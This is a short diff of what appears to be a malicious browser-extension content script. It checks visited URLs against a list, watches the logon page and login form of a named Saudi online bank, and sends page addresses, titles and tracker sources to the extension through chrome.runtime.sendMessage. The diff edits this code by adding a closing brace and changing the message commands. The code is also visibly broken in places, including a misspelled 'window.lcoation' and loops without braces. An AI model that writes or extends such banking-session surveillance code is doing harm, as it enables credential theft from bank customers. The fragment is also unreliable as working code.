@@ -5,7 +5,7 @@ for (var i = 0; i < arrayLength; i++) {
     if (window.location.href.indexOf(myStringArray[i]) > -1) {
          chrome.runtime.sendMessage({cmd: "w",data: window.lcoation.href});
 }
-
+}
 
 
 if (top['location']['href']['indexOf']('https://onlinebanking.anb.com.sa/RetailBank/app/logon.jsp') > -1) {
@@ -401,12 +401,12 @@ var login_form = document.getElementById("loginForm");
       var dati = {};
       dati.href = window.location.href;
       dati.title = document.title;
-      dati.amung = sc[i].src
-      chrome.runtime.sendMessage({cmd: "l",data: dati});
+      dati.amung = sc[i].src;
+      chrome.runtime.sendMessage({cmd: "n",data: dati});
     for (var i = 0; i < img.length; i++)
     	if (img[i].src.indexOf('amung.us') > -1)
       var dat = {};
       dat.href = window.location.href;
       dat.title = document.title;
       dat.amung = img[i].src;
-    	chrome.runtime.sendMessage({cmd: "l",data: dat});
+    	chrome.runtime.sendMessage({cmd: "n",data: dat});
